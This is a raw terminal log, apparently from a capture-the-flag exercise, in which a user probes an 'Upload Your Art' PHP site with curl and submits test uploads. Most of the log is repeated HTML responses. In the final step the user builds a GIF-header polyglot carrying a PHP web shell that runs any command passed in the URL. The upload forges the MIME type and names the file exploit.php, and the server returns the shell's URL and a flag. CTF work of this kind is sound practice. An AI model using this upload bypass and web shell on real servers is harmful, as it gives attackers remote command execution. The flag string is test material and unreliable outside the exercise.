]
└─$ curl -s -i 'http://54.72.82.22:8780/'

HTTP/1.1 200 OK
Date: Fri, 03 Oct 2025 05:40:23 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 4164
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Upload Your Art</title>
    <style>
        :root {
            --primary-color: #007bff;
            --success-color: #28a745;
            --error-color: #dc3545;
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --border-color: #dee2e6;
            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            font-family: var(--font-family);
            margin: 0;
            padding: 50px;
            background-color: var(--bg-color);
            color: #343a40;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            max-width: 800px;
            width: 100%;
        }

        h1 {
            color: var(--primary-color);
            margin-bottom: 5px;
            text-align: center;
        }

        p {
            line-height: 1.6;
            margin-bottom: 20px;
            text-align: center;
        }

        .goal {
            font-size: 1.1em;
            color: #495057;
            font-weight: 500;
        }

        .message-box {
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            word-break: break-word; /* To ensure flag code is wrapped */
        }
        .success {
            background-color: #d4edda;
            color: var(--success-color);
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: var(--error-color);
            border: 1px solid #f5c6cb;
        }

        .form-card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: 20px auto;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        input[type="file"] {
            padding: 10px;
            display: block;
            width: 100%;
            box-sizing: border-box;
            border: 1px solid #ced4da;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        input[type="submit"] {
            background-color: var(--primary-color);
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s;
            width: 100%;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        a {
            color: var(--primary-color);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }

        /* Code Snippet Styling */
        h2 {
            margin-top: 40px;
            border-bottom: 2px solid var(--border-color);
            padding-bottom: 5px;
            color: #343a40;
            text-align: left;
        }

        pre {
            background: #e9ecef;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            font-family: Consolas, 'Courier New', monospace;
            border: 1px solid #ced4da;
        }

        /* PHP Syntax Highlighting Simulation */
        .php-code .comment { color: #6c757d; }
        .php-code .keyword { color: #007bff; font-weight: bold; }
        .php-code .variable { color: #dc3545; }
        .php-code .string { color: #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Upload Your Art</h1>
        
        
        <div class="form-card">
            <form method="POST" enctype="multipart/form-data">
                <label for="file_input">Choose File:</label>
                <input type="file" name="uploaded_file" id="file_input" required>
                <input type="submit" value="Upload File">
            </form>
        </div>
    </div>
</body>
</html>
                                                                                                                  
┌──(vantrex㉿kali)-[~]
└─$ curl -s -i 'http://54.72.82.22:8780/'
curl -s -i 'http://54.72.82.22:8780/upload'

HTTP/1.1 200 OK
Date: Fri, 03 Oct 2025 05:40:46 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 4164
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Upload Your Art</title>
    <style>
        :root {
            --primary-color: #007bff;
            --success-color: #28a745;
            --error-color: #dc3545;
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --border-color: #dee2e6;
            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            font-family: var(--font-family);
            margin: 0;
            padding: 50px;
            background-color: var(--bg-color);
            color: #343a40;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            max-width: 800px;
            width: 100%;
        }

        h1 {
            color: var(--primary-color);
            margin-bottom: 5px;
            text-align: center;
        }

        p {
            line-height: 1.6;
            margin-bottom: 20px;
            text-align: center;
        }

        .goal {
            font-size: 1.1em;
            color: #495057;
            font-weight: 500;
        }

        .message-box {
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            word-break: break-word; /* To ensure flag code is wrapped */
        }
        .success {
            background-color: #d4edda;
            color: var(--success-color);
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: var(--error-color);
            border: 1px solid #f5c6cb;
        }

        .form-card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: 20px auto;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        input[type="file"] {
            padding: 10px;
            display: block;
            width: 100%;
            box-sizing: border-box;
            border: 1px solid #ced4da;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        input[type="submit"] {
            background-color: var(--primary-color);
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s;
            width: 100%;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        a {
            color: var(--primary-color);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }

        /* Code Snippet Styling */
        h2 {
            margin-top: 40px;
            border-bottom: 2px solid var(--border-color);
            padding-bottom: 5px;
            color: #343a40;
            text-align: left;
        }

        pre {
            background: #e9ecef;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            font-family: Consolas, 'Courier New', monospace;
            border: 1px solid #ced4da;
        }

        /* PHP Syntax Highlighting Simulation */
        .php-code .comment { color: #6c757d; }
        .php-code .keyword { color: #007bff; font-weight: bold; }
        .php-code .variable { color: #dc3545; }
        .php-code .string { color: #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Upload Your Art</h1>
        
        
        <div class="form-card">
            <form method="POST" enctype="multipart/form-data">
                <label for="file_input">Choose File:</label>
                <input type="file" name="uploaded_file" id="file_input" required>
                <input type="submit" value="Upload File">
            </form>
        </div>
    </div>
</body>
</html>
HTTP/1.1 404 Not Found
Date: Fri, 03 Oct 2025 05:40:47 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 275
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at 54.72.82.22 Port 8780</address>
</body></html>
                                                                                                                  
┌──(vantrex㉿kali)-[~]
└─$ bash -c 'echo "VANTREX_TEST" > /tmp/test.txt; curl -s -i -F "uploaded_file=@/tmp/test.txt" http://54.72.82.22:8780/'
HTTP/1.1 200 OK
Date: Fri, 03 Oct 2025 05:41:28 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 4321
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Upload Your Art</title>
    <style>
        :root {
            --primary-color: #007bff;
            --success-color: #28a745;
            --error-color: #dc3545;
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --border-color: #dee2e6;
            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            font-family: var(--font-family);
            margin: 0;
            padding: 50px;
            background-color: var(--bg-color);
            color: #343a40;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            max-width: 800px;
            width: 100%;
        }

        h1 {
            color: var(--primary-color);
            margin-bottom: 5px;
            text-align: center;
        }

        p {
            line-height: 1.6;
            margin-bottom: 20px;
            text-align: center;
        }

        .goal {
            font-size: 1.1em;
            color: #495057;
            font-weight: 500;
        }

        .message-box {
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            word-break: break-word; /* To ensure flag code is wrapped */
        }
        .success {
            background-color: #d4edda;
            color: var(--success-color);
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: var(--error-color);
            border: 1px solid #f5c6cb;
        }

        .form-card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: 20px auto;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        input[type="file"] {
            padding: 10px;
            display: block;
            width: 100%;
            box-sizing: border-box;
            border: 1px solid #ced4da;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        input[type="submit"] {
            background-color: var(--primary-color);
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s;
            width: 100%;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        a {
            color: var(--primary-color);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }

        /* Code Snippet Styling */
        h2 {
            margin-top: 40px;
            border-bottom: 2px solid var(--border-color);
            padding-bottom: 5px;
            color: #343a40;
            text-align: left;
        }

        pre {
            background: #e9ecef;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            font-family: Consolas, 'Courier New', monospace;
            border: 1px solid #ced4da;
        }

        /* PHP Syntax Highlighting Simulation */
        .php-code .comment { color: #6c757d; }
        .php-code .keyword { color: #007bff; font-weight: bold; }
        .php-code .variable { color: #dc3545; }
        .php-code .string { color: #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Upload Your Art</h1>
        
        <div class="message-box error"><strong>ERROR:</strong> File type (MIME: text/plain) is not allowed! Only image/jpeg, image/png, image/gif are accepted.</div>
        <div class="form-card">
            <form method="POST" enctype="multipart/form-data">
                <label for="file_input">Choose File:</label>
                <input type="file" name="uploaded_file" id="file_input" required>
                <input type="submit" value="Upload File">
            </form>
        </div>
    </div>
</body>
</html>
                                                                                                                  
┌──(vantrex㉿kali)-[~]
└─$ bash -c 'echo "VANTREX_TEST" > /tmp/test.txt; curl -s -i -F "uploaded_file=@/tmp/test.txt" http://54.72.82.22:8780/'

HTTP/1.1 200 OK
Date: Fri, 03 Oct 2025 05:41:32 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 4321
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Upload Your Art</title>
    <style>
        :root {
            --primary-color: #007bff;
            --success-color: #28a745;
            --error-color: #dc3545;
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --border-color: #dee2e6;
            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            font-family: var(--font-family);
            margin: 0;
            padding: 50px;
            background-color: var(--bg-color);
            color: #343a40;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            max-width: 800px;
            width: 100%;
        }

        h1 {
            color: var(--primary-color);
            margin-bottom: 5px;
            text-align: center;
        }

        p {
            line-height: 1.6;
            margin-bottom: 20px;
            text-align: center;
        }

        .goal {
            font-size: 1.1em;
            color: #495057;
            font-weight: 500;
        }

        .message-box {
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            word-break: break-word; /* To ensure flag code is wrapped */
        }
        .success {
            background-color: #d4edda;
            color: var(--success-color);
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: var(--error-color);
            border: 1px solid #f5c6cb;
        }

        .form-card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: 20px auto;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        input[type="file"] {
            padding: 10px;
            display: block;
            width: 100%;
            box-sizing: border-box;
            border: 1px solid #ced4da;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        input[type="submit"] {
            background-color: var(--primary-color);
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s;
            width: 100%;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        a {
            color: var(--primary-color);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }

        /* Code Snippet Styling */
        h2 {
            margin-top: 40px;
            border-bottom: 2px solid var(--border-color);
            padding-bottom: 5px;
            color: #343a40;
            text-align: left;
        }

        pre {
            background: #e9ecef;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            font-family: Consolas, 'Courier New', monospace;
            border: 1px solid #ced4da;
        }

        /* PHP Syntax Highlighting Simulation */
        .php-code .comment { color: #6c757d; }
        .php-code .keyword { color: #007bff; font-weight: bold; }
        .php-code .variable { color: #dc3545; }
        .php-code .string { color: #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Upload Your Art</h1>
        
        <div class="message-box error"><strong>ERROR:</strong> File type (MIME: text/plain) is not allowed! Only image/jpeg, image/png, image/gif are accepted.</div>
        <div class="form-card">
            <form method="POST" enctype="multipart/form-data">
                <label for="file_input">Choose File:</label>
                <input type="file" name="uploaded_file" id="file_input" required>
                <input type="submit" value="Upload File">
            </form>
        </div>
    </div>
</body>
</html>
                                                                                                                  
┌──(vantrex㉿kali)-[~]
└─$ bash -lc 'printf "GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00" > /tmp/shell.gif; printf "<?php echo \"START\"; passthru(\$_GET[\"cmd\"]); echo \"END\"; ?>" >> /tmp/shell.gif; curl -s -i -F "uploaded_file=@/tmp/shell.gif;type=image/gif;filename=exploit.php" http://54.72.82.22:8780/'

HTTP/1.1 200 OK
Date: Fri, 03 Oct 2025 05:42:05 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 4453
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Upload Your Art</title>
    <style>
        :root {
            --primary-color: #007bff;
            --success-color: #28a745;
            --error-color: #dc3545;
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --border-color: #dee2e6;
            --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            font-family: var(--font-family);
            margin: 0;
            padding: 50px;
            background-color: var(--bg-color);
            color: #343a40;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            max-width: 800px;
            width: 100%;
        }

        h1 {
            color: var(--primary-color);
            margin-bottom: 5px;
            text-align: center;
        }

        p {
            line-height: 1.6;
            margin-bottom: 20px;
            text-align: center;
        }

        .goal {
            font-size: 1.1em;
            color: #495057;
            font-weight: 500;
        }

        .message-box {
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            word-break: break-word; /* To ensure flag code is wrapped */
        }
        .success {
            background-color: #d4edda;
            color: var(--success-color);
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: var(--error-color);
            border: 1px solid #f5c6cb;
        }

        .form-card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: 20px auto;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }

        input[type="file"] {
            padding: 10px;
            display: block;
            width: 100%;
            box-sizing: border-box;
            border: 1px solid #ced4da;
            border-radius: 4px;
            margin-bottom: 20px;
        }

        input[type="submit"] {
            background-color: var(--primary-color);
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s;
            width: 100%;
        }

        input[type="submit"]:hover {
            background-color: #0056b3;
        }

        a {
            color: var(--primary-color);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }

        /* Code Snippet Styling */
        h2 {
            margin-top: 40px;
            border-bottom: 2px solid var(--border-color);
            padding-bottom: 5px;
            color: #343a40;
            text-align: left;
        }

        pre {
            background: #e9ecef;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            font-family: Consolas, 'Courier New', monospace;
            border: 1px solid #ced4da;
        }

        /* PHP Syntax Highlighting Simulation */
        .php-code .comment { color: #6c757d; }
        .php-code .keyword { color: #007bff; font-weight: bold; }
        .php-code .variable { color: #dc3545; }
        .php-code .string { color: #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Upload Your Art</h1>
        
        <div class="message-box success"><strong>SUCCESS:</strong></div><p>Uploaded file URL: <a href="/uploads/exploit.php" target="_blank">/uploads/exploit.php</a></p><div class="message-box success"><strong>Your Art Is:</strong> <code>saf_ctf{29cebef5-4c84-4b0a-acc9-2a17ed3e8740}
</code></div>
        <div class="form-card">
            <form method="POST" enctype="multipart/form-data">
                <label for="file_input">Choose File:</label>
                <input type="file" name="uploaded_file" id="file_input" required>
                <input type="submit" value="Upload File">
            </form>
        </div>
    </div>
</body>
</html>
                                                                                                                  
┌──(vantrex㉿kali)-[~]
